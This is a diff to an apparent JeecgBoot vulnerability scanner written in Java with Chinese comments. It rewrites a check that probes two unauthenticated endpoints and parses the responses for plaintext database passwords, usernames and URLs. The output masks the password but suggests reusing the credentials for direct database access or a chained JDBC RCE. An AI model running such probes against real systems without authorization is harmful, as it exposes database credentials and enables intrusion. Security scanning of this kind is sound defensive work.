@@ -1,9 +1,9 @@
-package com.jeescan.checks;
+package com.jeecgboottiplus.checks;
 
-import com.jeescan.core.Detector;
-import com.jeescan.core.Http;
-import com.jeescan.core.Json;
-import com.jeescan.core.Result;
+import com.jeecgboottiplus.core.Detector;
+import com.jeecgboottiplus.core.Http;
+import com.jeecgboottiplus.core.Json;
+import com.jeecgboottiplus.core.Result;
 
 import java.util.LinkedHashMap;
 import java.util.Map;
@@ -128,26 +128,99 @@ public final class InfoLeak {
     }
 
     // ---------------------------------------------------------------- #23
-    public static class DataSourceList extends GetProbe {
+    /**
+     * 数据源账密泄露。
+     *
+     * 覆盖两条已知路径：
+     *   a) /sys/dataSource/list            —— JeecgGo Config.yaml
+     *   b) /jmreport/getDataSourceByPage   —— 积木报表数据源分页，返回 dbPassword 明文
+     *
+     * 判定升级：不只看"有数据"，还要看响应里是否真的出现 dbPassword 字段
+     * （或非空的 dbUrl/dbUsername 组合），否则只是空列表不算泄露。
+     */
+    public static class DataSourceList extends Detector {
         public DataSourceList() {
-            super("23", "数据源账密泄露", "/sys/dataSource/list",
+            super("23", "数据源账密泄露",
+                  "/sys/dataSource/list + /jmreport/getDataSourceByPage",
                   "未授权", "critical", false,
-                  "POC 来源 JeecgGo: /sys/dataSource/list（非 jmreport/datasource/list）");
+                  "两条路径都测；判定要求响应里真的出现 dbPassword/dbUrl 等明文凭据字段");
         }
 
-        String posPath(Ctx ctx) { return ctx.p("sys/dataSource/list"); }
+        private static final String[] PATHS = {
+                "sys/dataSource/list",
+                "jmreport/getDataSourceByPage?pageNo=1&pageSize=100",
+        };
 
-        String negPath(Ctx ctx, String r) { return ctx.p("sys/__n0pe" + r + "__"); }
+        @Override
+        public Result run(Ctx ctx) {
+            Result res = newResult();
+            Http h = ctx.http;
+            String hitPath = null;
+            String hitPwd = null;
+            int hitCount = 0;
 
-        boolean posHit(Http.Resp r, String raw) {
-            if (!jsonSuccess(r)) return false;
-            // 兼容 result 为数组或 {records:[]} 两种形态
-            Object res = Json.get(raw, "result");
-            if (res instanceof java.util.List) {
-                return !((java.util.List<?>) res).isEmpty();
+            for (String p : PATHS) {
+                String path = ctx.p(p);
+                Http.Resp r = h.get(path);
+                res.trace("探测 " + p, "GET", h.url(path), null, r,
+                        "期望返回数据源列表，含 dbPassword 明文");
+                if (isRst(r)) continue;
+
+                int n = countRecords(r.text);
+                String pwd = firstField(r.text, "dbPassword");
+                String user = firstField(r.text, "dbUsername");
+                String url = firstField(r.text, "dbUrl");
+
+                boolean leaked = jsonSuccess(r) && n > 0
+                        && (pwd != null || (user != null && url != null));
+                if (leaked) {
+                    hitPath = path;
+                    hitPwd = pwd;
+                    hitCount = n;
+                    break;
+                }
             }
-            Object recs = Json.get(raw, "result.records");
-            return recs instanceof java.util.List && !((java.util.List<?>) recs).isEmpty();
+
+            if (hitPath == null) {
+                return res.set(Result.State.SAFE, "未返回数据源凭据");
+            }
+
+            res.ev("未授权读取数据源成功，返回 " + hitCount + " 条记录");
+            if (hitPwd != null) {
+                String masked = hitPwd.length() <= 2 ? "**"
+                        : hitPwd.substring(0, 1) + "***" + hitPwd.substring(hitPwd.length() - 1);
+                res.ev("第一条 dbPassword 明文：" + masked + "（长度 " + hitPwd.length() + "）");
+            }
+            res.ev("影响：可用该凭据直连数据库，或拼进 #2 testConnection 打 JDBC RCE");
+            res.repro("curl -s '" + h.url(hitPath) + "'");
+            return res.set(Result.State.VULN, "数据源明文账密泄露（" + hitCount + " 条）");
+        }
+
+        /** 统计 records 数组条数，兼容 result 直接是数组的情况。 */
+        private static int countRecords(String s) {
+            if (s == null) return 0;
+            int n = 0, i = 0;
+            while ((i = s.indexOf("\"dbUrl\"", i)) >= 0) { n++; i += 7; }
+            if (n > 0) return n;
+            i = 0;
+            while ((i = s.indexOf("\"dbPassword\"", i)) >= 0) { n++; i += 12; }
+            return n;
+        }
+
+        /** 取 JSON 里某个字段的第一个字符串值。 */
+        private static String firstField(String s, String key) {
+            if (s == null) return null;
+            String k = "\"" + key + "\"";
+            int i = s.indexOf(k);
+            if (i < 0) return null;
+            int c = s.indexOf(':', i + k.length());
+            if (c < 0) return null;
+            int q1 = s.indexOf('"', c + 1);
+            if (q1 < 0) return null;
+            int q2 = s.indexOf('"', q1 + 1);
+            if (q2 < 0) return null;
+            String v = s.substring(q1 + 1, q2);
+            return v.isEmpty() || "null".equals(v) ? null : v;
         }
     }
 
